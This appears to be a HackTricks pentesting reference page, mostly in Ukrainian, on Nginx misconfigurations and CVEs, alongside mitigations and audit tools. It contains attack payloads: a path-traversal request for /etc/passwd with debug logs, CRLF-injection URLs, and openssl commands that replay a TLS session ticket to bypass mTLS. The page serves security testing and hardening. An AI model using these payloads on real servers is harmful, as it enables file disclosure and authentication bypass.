# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Missing root location <a href="#missing-root-location" id="missing-root-location"></a>

Під час налаштування сервера Nginx, **root directive** відіграє критичну роль, оскільки визначає базовий каталог, з якого віддаються файли. Розгляньте приклад нижче:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
У цій конфігурації `/etc/nginx` призначено як кореневу директорію. Така настройка дозволяє отримувати доступ до файлів у вказаній root директорії, наприклад `/hello.txt`. Водночас важливо зазначити, що визначено лише конкретний location (`/hello.txt`). Конфігурації для кореневого розташування (`location / {...}`) немає. Через це директива root застосовується глобально, що дозволяє запитам до кореневого шляху `/` отримувати файли з `/etc/nginx`.

З цього випливає серйозний аспект безпеки. Простий `GET` запит, наприклад `GET /nginx.conf`, може розкрити чутливу інформацію, віддавши файл конфігурації Nginx, розташований за `/etc/nginx/nginx.conf`. Встановлення root у менш критичну директорію, наприклад `/etc`, може зменшити цей ризик, але все ще може дозволити ненавмисний доступ до інших критичних файлів, включно з іншими файлами конфігурації, журналами доступу та навіть зашифрованими обліковими даними, що використовуються для HTTP basic authentication.

## Alias LFI — неправильна конфігурація <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

У конфігураційних файлах Nginx варто уважно перевіряти директиви "location". Уразливість, відома як Local File Inclusion (LFI), може бути ненавмисно введена через конфігурацію, що нагадує таку:
```
location /imgs {
alias /path/images/;
}
```
Ця конфігурація вразлива до LFI-атак, оскільки сервер інтерпретує запити на зразок `/imgs../flag.txt` як спробу доступу до файлів поза призначеним каталогом, фактично розв'язуючи їх як `/path/images/../flag.txt`. Ця помилка дозволяє зловмисникам отримувати файли з файлової системи сервера, які не повинні бути доступні через веб.

Щоб пом'якшити цю вразливість, конфігурацію слід змінити так:
```
location /imgs/ {
alias /path/images/;
}
```
Детальніше: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Тести Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Небезпечне обмеження шляху <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Перегляньте наступну сторінку, щоб дізнатися, як обходити директиви, такі як:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Небезпечне використання змінних / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Уразливими змінними є `$uri` та `$document_ur`i, і це можна виправити, замінивши їх на `$request_uri`.
>
> Регулярний вираз також може бути вразливим, наприклад:
>
> `location ~ /docs/([^/])? { … $1 … }` - Уразливий
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Не уразливий (перевірка пробілів)
>
> `location ~ /docs/(.*)? { … $1 … }` - Не уразливий

Нижче наведено приклад, який демонструє уразливість у конфігурації Nginx:
```
location / {
return 302 https://example.com$uri;
}
```
Символи \r (Carriage Return) та \n (Line Feed) позначають символи нового рядка в HTTP-запитах, а їхні URL-кодовані форми представлені як `%0d%0a`. Включення цих символів у запит (наприклад, `http://localhost/%0d%0aDetectify:%20clrf`) до некоректно налаштованого сервера призводить до того, що сервер додає новий заголовок з ім'ям `Detectify`. Це відбувається тому, що змінна $uri декодує URL-кодовані символи нового рядка, що призводить до несподіваного заголовка у відповіді:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Дізнайтеся більше про ризики CRLF injection та response splitting за адресою [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Також ця техніка [**пояснена в цій доповіді**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) з кількома вразливими прикладами та механізмами виявлення. Наприклад, щоб виявити цю неправильну конфігурацію з погляду blackbox, ви можете надіслати такі запити:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Якщо є вразливість, перший поверне відповідь, оскільки "X" — будь-який HTTP-метод, а другий поверне помилку, оскільки "H" не є дійсним методом. Отже сервер отримає щось на кшталт: `GET / H HTTP/1.1` і це викличе помилку.

Інші приклади виявлення:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Деякі знайдені вразливі конфігурації, показані в тій доповіді, були:

- Зверніть увагу, як **`$uri`** встановлено без змін у кінцевому URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Зверніть увагу, що знову **`$uri`** є в URL (цього разу всередині parameter)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Тепер в AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Будь-яка змінна

Було виявлено, що **дані, що надаються користувачем** можуть за певних обставин оброблятися як **Nginx-змінна**. Причина такої поведінки лишається дещо невизначеною, проте це не рідкість і не так просто перевірити. Цю аномалію було висвітлено в звіті з безпеки на HackerOne, який можна переглянути [here](https://hackerone.com/reports/370094). Подальше розслідування повідомлення про помилку дозволило ідентифікувати її появу в [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), вказавши Server Side Includes (SSI) як корінну причину.

Щоб виявити цю неправильну конфігурацію, можна виконати таку команду, яка встановлює заголовок Referer для перевірки виведення змінних:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Сканування на наявність цієї неправильної конфігурації в різних системах виявило кілька випадків, коли змінні Nginx могли бути виведені користувачем. Однак зменшення кількості вразливих екземплярів свідчить про те, що зусилля з виправлення цієї проблеми були частково успішними.

### Використання try_files зі змінними $URI$ARGS

Наступна неправильна конфігурація Nginx може призвести до вразливості LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
У нашій конфігурації є директива `try_files`, яка використовується для перевірки наявності файлів у вказаному порядку. Nginx віддасть перший файл, який знайде. Базовий синтаксис директиви `try_files` виглядає так:
```
try_files file1 file2 ... fileN fallback;
```
Nginx перевіряє наявність кожного файлу в зазначеному порядку. Якщо файл існує, він буде відданий негайно. Якщо жоден із зазначених файлів не існує, запит буде передано на fallback — це може бути інший URI або конкретна сторінка помилки.

Однак при використанні змінних `$uri$args` у цій директиві Nginx намагатиметься знайти файл, що відповідає URI запиту разом із будь‑якими аргументами рядка запиту. Тому ми можемо експлуатувати цю конфігурацію:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
З наступним payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Використовуючи наш payload, ми вийдемо за межі кореневого каталогу (визначеного в конфігурації Nginx) і завантажимо файл `/etc/passwd`. У debug logs ми можемо спостерігати, як Nginx намагається відкрити файли:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC проти Nginx з використанням конфігурації, згаданої вище:
![Example burp request](../../images/nginx_try_files.png)

## Читання сирої відповіді backend

Nginx пропонує можливість через `proxy_pass`, яка дозволяє перехоплювати помилки та HTTP заголовки, що генеруються backend, з метою приховати внутрішні повідомлення про помилки та заголовки. Це досягається тим, що Nginx віддає кастомні сторінки помилок у відповідь на помилки backend. Однак проблеми виникають, коли Nginx отримує некоректний HTTP запит. Такий запит пересилається до backend у тому вигляді, в якому надійшов, а сіра відповідь backend потім безпосередньо відправляється клієнту без втручання Nginx.

Розглянемо приклад сценарію з участю uWSGI application:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Для цього в конфігурації Nginx використовуються спеціальні директиви:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Ця директива дозволяє Nginx повертати користувацьку відповідь для відповідей бекенда зі статусним кодом більше 300. Вона гарантує, що, для нашого прикладу з uWSGI додатком, відповідь `500 Error` буде перехоплена й оброблена Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Як випливає з назви, ця директива приховує вказані HTTP заголовки від клієнта, підвищуючи приватність та безпеку.

Коли надходить дійсний запит `GET`, Nginx обробляє його нормально, повертаючи стандартну помилку без розкриття яких-небудь секретних заголовків. Однак некоректний HTTP-запит обходить цей механізм і призводить до розкриття сирих відповідей бекенда, включаючи секретні заголовки та повідомлення про помилки.

## merge_slashes встановлено в off

За замовчуванням директива **`merge_slashes`** в Nginx встановлена в **`on`**, що зводить кілька косих рисок у URL до однієї. Ця функція, хоч і спрощує обробку URL, може ненавмисно приховати вразливості в додатках за Nginx, особливо уразливі до local file inclusion (LFI) атак. Експерти з безпеки **Danny Robinson and Rotem Bar** вказували на потенційні ризики, пов'язані з такою поведінкою за замовчуванням, особливо коли Nginx діє як reverse-proxy.

Щоб зменшити такі ризики, рекомендовано **вимкнути директиву `merge_slashes`** для додатків, які вразливі до таких проблем. Це гарантує, що Nginx пересилає запити додатку без зміни структури URL, і тим самим не маскує підлеглих вразливостей.

Для детальнішої інформації див. [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious заголовки відповіді**

Як показано в [**this writeup**](https://mizu.re/post/cors-playground), є певні заголовки, які, якщо присутні в відповіді вебсерверу, змінюють поведінку проксі Nginx. Ви можете перевірити їх [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Indicate Nginx to internally redirect a request to a specified location.
- `X-Accel-Buffering`: Controls whether Nginx should buffer the response or not.
- `X-Accel-Charset`: Sets the character set for the response when using X-Accel-Redirect.
- `X-Accel-Expires`: Sets the expiration time for the response when using X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Limits the rate of transfer for responses when using X-Accel-Redirect.

For example, the header **`X-Accel-Redirect`** will cause an internal **redirect** in the nginx. So having an nginx configuration with something such as **`root /`** and a response from the web server with **`X-Accel-Redirect: .env`** will make nginx sends the content of **`/.env`** (Path Traversal).

### **Значення за замовчуванням у директиві map**

У **конфігурації Nginx** директива `map` часто використовується для **контролю авторизації**. Поширена помилка — не вказати значення **default**, що може призвести до несанкціонованого доступу. Наприклад:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Без `default` **зловмисник** може обійти захист, отримавши доступ до **невизначеного URI** в межах `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) радить встановити **значення за замовчуванням**, щоб уникнути таких проблем.

### **DNS Spoofing Vulnerability**

DNS spoofing проти Nginx можливий за певних умов. Якщо зловмисник знає DNS server, який використовує Nginx, і може перехоплювати його DNS-запити, він може підмінити DNS-записи. Однак цей метод неефективний, якщо Nginx налаштований використовувати localhost (127.0.0.1) для розв'язання DNS. Nginx дозволяє вказувати DNS server таким чином:
```yaml
resolver 8.8.8.8;
```
### **Директиви `proxy_pass` та `internal`**

Директива **`proxy_pass`** використовується для перенаправлення запитів до інших серверів, як внутрішніх, так і зовнішніх. Директива **`internal`** гарантує, що певні локації доступні лише всередині Nginx. Хоча самі по собі ці директиви не є вразливістю, їхню конфігурацію потрібно ретельно перевіряти, щоб запобігти потенційним проблемам із безпекою.

## proxy_set_header Upgrade & Connection

Якщо сервер nginx налаштовано на передачу заголовків Upgrade і Connection, може бути виконана [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) для доступу до захищених/внутрішніх ендпоінтів.

> [!CAUTION]
> Ця вразливість дозволяє нападникові **встановити пряме з'єднання з кінцевою точкою `proxy_pass`** (`http://backend:9999` у цьому випадку), вміст якої не буде перевірятися nginx.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Зауважте, що навіть якщо `proxy_pass` вказував на конкретний **path** такий як `http://backend:9999/socket.io`, з'єднання буде встановлено з `http://backend:9999`, тож ви можете **contact any other path inside that internal endpoint. So it doesn't matter if a path is specified in the URL of proxy_pass.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Під час 2024 Nginx розкрив CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 та CVE-2024-35200, показавши, що **одна ворожа QUIC session** може аварійно завершувати worker процеси або спричиняти leak пам'яті, коли експериментальний `ngx_http_v3_module` скомпільований і відкрито сокет `listen ... quic`. Вразливі збірки: 1.25.0–1.25.5 та 1.26.0, тоді як 1.27.0/1.26.1 містять виправлення; disclosure пам'яті (CVE-2024-34161) додатково вимагає MTUs більші за 4096 байт, щоб виступили чутливі дані (деталі в 2024 nginx advisory, згаданому нижче).

**Recon & exploitation hints**

- HTTP/3 is opt-in, so scan for `Alt-Svc: h3=":443"` responses or brute-force UDP/443 QUIC handshakes; once confirmed, fuzz the handshake and STREAM frames with custom `quiche-client`/`nghttp3` payloads to trigger worker crashes and force log leakage.
- Швидко визначте підтримку цілі за допомогою:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Обхід відновлення TLS-сесії для автентифікації клієнтським сертифікатом (CVE-2025-23419)

У лютому 2025 року в повідомленні було розкрито, що nginx 1.11.4–1.27.3, зібраний з OpenSSL, дозволяє **повторно використовувати TLS 1.3 сесію** з одного name-based virtual host в іншому, тож клієнт, який погодився на хост без сертифіката, може відтворити ticket/PSK, щоб потрапити у vhost, захищений `ssl_verify_client on;`, і повністю обійти mTLS. Баг проявляється щоразу, коли кілька віртуальних хостів ділять той самий кеш TLS 1.3 сесій та tickets (див. повідомлення nginx 2025 року нижче).

**План дій атакуючого**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Якщо ціль уразлива, друге рукостискання завершується без пред'явлення клієнтського сертифіката, що призводить до розкриття захищених локацій.

**Що перевіряти**

- Змішані блоки `server_name`, які спільно використовують `ssl_session_cache shared:SSL` та `ssl_session_tickets on;`.
- Блоки Admin/API, які очікують mTLS, але успадковують налаштування спільного кешу сесій/квитків від публічних хостів.
- Автоматизація, яка вмикає відновлення сесії TLS 1.3 глобально (e.g., Ansible roles) без урахування ізоляції vhost.

## HTTP/2 Rapid Reset resilience (CVE-2023-44487 behavior)

The HTTP/2 Rapid Reset attack (CVE-2023-44487) все ще впливає на nginx, коли оператори піднімають `keepalive_requests` або `http2_max_concurrent_streams` вище за значення за замовчуванням: нападник відкриває одне HTTP/2-з'єднання, заповнює його тисячами потоків, а потім негайно надсилає кадри `RST_STREAM`, щоб стеля конкурентності ніколи не досягалася, тоді як CPU продовжує витрачати ресурси на логіку завершення. Nginx defaults (128 concurrent streams, 1000 keepalive requests) утримують радіус ураження малим; значне підвищення цих обмежень робить тривіальним виснаження worker-ів навіть від одного клієнта (see the F5 write-up referenced below).

**Поради щодо виявлення**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Хости, які виявляють неприродно високі значення цих директив, є пріоритетними цілями: один HTTP/2 клієнт може в циклі створювати стріми й миттєво відправляти `RST_STREAM` кадри, утримуючи CPU завантаженим, не перевищуючи ліміт одночасних з'єднань.

## Спробуйте самостійно

Detectify створили репозиторій на GitHub, де ви можете використовувати Docker, щоб налаштувати власний вразливий тестовий сервер Nginx з деякими з неправильних конфігурацій, обговорених у цій статті, і спробувати знайти їх самостійно!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Інструменти статичного аналізу

### [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)

GixyNG (оновлений форк GIXY) — інструмент для аналізу конфігурацій Nginx з метою виявлення вразливостей, небезпечних директив та ризикових неправильних конфігурацій. Він також знаходить налаштування, що впливають на продуктивність, і виявляє пропущені можливості для hardening, дозволяючи автоматизоване виявлення недоліків.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner — простий інструмент для пошуку поширених неправильних конфігурацій Nginx та вразливостей.

## Джерела

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
